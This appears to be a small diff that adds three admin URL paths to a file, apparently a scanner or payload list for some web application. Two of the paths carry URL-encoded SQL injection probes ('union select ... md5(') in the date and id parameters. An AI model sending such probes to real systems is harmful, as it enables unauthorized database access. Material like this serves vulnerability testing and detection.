@@ -1,0 +1,3 @@
+/admin/?page=reports&date=2022-05-27%27%20union%20select%201,2,3,md5(
+/admin/?page=user/manage_user&id=-6%27%20union%20select%201,md5(
+/admin/requests/take_action.php?id=6
